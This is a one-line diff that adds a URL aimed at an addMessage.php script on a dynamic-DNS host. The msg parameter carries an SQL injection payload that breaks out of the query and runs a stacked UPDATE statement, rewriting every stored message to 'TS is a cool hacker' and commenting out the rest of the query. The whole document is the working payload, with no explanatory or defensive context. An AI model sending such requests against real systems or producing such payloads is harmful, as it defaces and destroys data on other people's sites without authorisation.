@@ -1,0 +1,1 @@
+http://yand.dyndns.org:9998/addMessage.php?msg=654'); UPDATE messages SET message="TS is a cool hacker"; --
